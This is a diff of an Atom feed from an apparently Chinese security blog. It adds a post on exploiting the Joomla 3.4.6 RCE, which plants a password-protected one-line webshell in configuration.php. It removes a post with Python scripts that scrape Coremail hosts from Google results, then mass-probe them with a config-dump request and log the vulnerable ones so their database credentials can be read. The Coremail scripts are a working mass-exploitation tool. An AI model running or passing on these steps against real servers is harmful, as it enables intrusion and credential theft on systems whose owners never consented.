@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://www.svenbeast.com/</id>
     <title>斯文beast</title>
-    <updated>2019-10-10T01:20:08.853Z</updated>
+    <updated>2019-10-10T07:40:22.644Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://www.svenbeast.com/"/>
     <link rel="self" href="http://www.svenbeast.com//atom.xml"/>
@@ -10,6 +10,36 @@
     <logo>http://www.svenbeast.com//images/avatar.png</logo>
     <icon>http://www.svenbeast.com//favicon.ico</icon>
     <rights>All rights reserved 2019, 斯文beast</rights>
+    <entry>
+        <title type="html"><![CDATA[Joomla 3.4.6-RCE漏洞利用]]></title>
+        <id>http://www.svenbeast.com//post/WH877Va6k</id>
+        <link href="http://www.svenbeast.com//post/WH877Va6k">
+        </link>
+        <updated>2019-10-10T07:10:48.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="0x01-背景">0x01 背景</h3>
+<ul>
+<li>Joomla是一套支持多种语言，全球都有名的CMS系统。其实日常也见不到😗</li>
+<li>这次披露的是Joomla 3.4.6版本，最新版本目前是3.9.12</li>
+</ul>
+<h3 id="0x02-搭建环境">0x02 搭建环境</h3>
+<ul>
+<li>下载地址：https://github.com/joomla/joomla-cms/releases/download/3.4.6/Joomla_3.4.6-Stable-Full_Package.zip</li>
+<li>让我们来使用phpstudy_pro来搭建环境吧🙃，这次不会再有后门了吧<br>
+<img src="http://www.svenbeast.com//post-images/1570692151502.png" alt=""><br>
+<img src="http://www.svenbeast.com//post-images/1570692253263.png" alt=""><br>
+<img src="http://www.svenbeast.com//post-images/1570692290692.png" alt=""></li>
+</ul>
+<h3 id="0x03-getshell">0x03 getshell</h3>
+<ul>
+<li>已经有成型exp了，让我们直接上手吧，成功getshell</li>
+<li>它会在configuration.php文件中写入一句话，密码为vchvnalfdvnrrogormraprcrclduahcmjsyclppxegutxrjhog<br>
+<img src="http://www.svenbeast.com//post-images/1570692440276.png" alt=""><br>
+<img src="http://www.svenbeast.com//post-images/1570693086231.png" alt=""><br>
+<img src="http://www.svenbeast.com//post-images/1570693192611.png" alt=""><br>
+<img src="http://www.svenbeast.com//post-images/1570693126424.png" alt=""></li>
+</ul>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[phpstudy后门利用方法及getshell]]></title>
         <id>http://www.svenbeast.com//post/2OBQlt_Ta</id>
@@ -978,82 +1008,6 @@ for x in range(th_num):
 解压密码：svenbeast</p>
 <h3 id="ps因博客重建特意将本人文章从tools转移回来如有影响可联系删帖">PS：因博客重建，特意将本人文章从Tools转移回来，如有影响，可联系删帖</h3>
 <p>文章链接（来点个顶可好~）：https://www.t00ls.net/thread-51610-1-1.html</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[coremail批量刷src]]></title>
-        <id>http://www.svenbeast.com//post/coremail-pi-liang-shua-src</id>
-        <link href="http://www.svenbeast.com//post/coremail-pi-liang-shua-src">
-        </link>
-        <updated>2019-06-16T16:33:05.000Z</updated>
-        <content type="html"><![CDATA[<ul>
-<li>用来小批量刷src的洞是hw这几天曝出的coremail的信息泄露漏洞，量级够，所以可堪一战</li>
-<li>在此对写coremail的POC的作者表示感谢la -.-!</li>
-</ul>
-<h3 id="首先步骤1利用google语法列出搜索结果并保存网页">首先步骤1：利用google语法列出搜索结果并保存网页#</h3>
-<p>这里图片里的google语法是 inurl:coremail（其他语法需自行构造，最好加上中文关键字），然后翻到第2页，ctrl+s将页面保存为1.html<br>
-ps：拥有ZoomEye，Fofa，shodan账号的略过即可 -.-</p>
-<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1563502445782.png" alt=""></figure>
-<h3 id="步骤2获取html文件中的coremaile域名">步骤2：获取html文件中的coremaile域名#</h3>
-<p>usage：python2 damain.py</p>
-<pre><code>#coding=utf-8
-import sys
-import requests
-from lxml import etree
-
-
-# def check_url(url):
-
-with open('1.html','r') as f:
-    text=f.read()
-    html = etree.HTML(text)
-    results = html.xpath('//*[@id=&quot;rso&quot;]/div[1]/div/div/div/div/div/a')
-    with open('ip.txt','a') as s:
-        for i in results:
-            print i.get('href').split('/')[2]
-            url=i.get('href').split('/')[2]
-            s.write('http://'+url)
-            s.write('\n')
-</code></pre>
-<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1563502540703.png" alt=""></figure>
-<p>会在当前目录下生成ip.txt</p>
-<p>Ps：记得把生成的ip.txt文件中google.com后缀的网站删掉，这个是google翻译，不删掉有些浪费检测时间，毕竟是单线程，hh。<br>
-步骤3：批量验证漏洞#<br>
-usage：python2 poc.py</p>
-<pre><code>#-*- Coding: utf-8 -*-
-
-import requests,sys
-
-
-def mailsmsPoC(url):
-    url = url + &quot;/mailsms/s?func=ADMIN:appState&amp;dumpConfig=/&quot;
-    try:
-        r = requests.get(url,timeout=8000)
-        if (r.status_code != '404') and (&quot;/home/coremail&quot; in r.text):
-            print &quot;mailsms is vulnerable: {0}&quot;.format(url)
-            with open('vul.txt', 'a') as f:
-                    f.write(url + '\n')
-        else:
-            print &quot;mailsms is safe!&quot;
-    except Exception as e:
-        print &quot;######time out######&quot;
-if __name__ == '__main__':
-    try:
-        mailsmsPoC(sys.argv[1])
-    except:
-        print &quot;python poc.py&quot;
-
-file = open('ip.txt', 'r')
-for f in file.readlines():
-    url = f.strip('\r\n')
-    mailsmsPoC(url)
-</code></pre>
-<figure data-type="image" tabindex="3"><img src="http://www.svenbeast.com//post-images/1563502552598.png" alt=""></figure>
-<p>步骤4：存在漏洞的会在当前目录下生成vul.txt，直接复制url粘贴到网页上，ctr+f搜索database就可以看到数据库的账号密码一些信息了,就可以开始截图进行src提交了#<br>
-<img src="http://www.svenbeast.com//post-images/1563502558364.png" alt=""></p>
-<p>结束：获取域名时，后得到的域名是编辑进ip.txt文件的，所以不必担心多次获取域名后替换前面已获取的。</p>
-<h3 id="ps因博客重建特意将本人文章从圈子转移回来如有影响可联系删帖">PS：因博客重建，特意将本人文章从圈子转移回来，如有影响，可联系删帖</h3>
-<p>文章链接（来点个顶可好~）：https://www.secquan.org/Discuss/1069678</p>
 ]]></content>
     </entry>
 </feed>
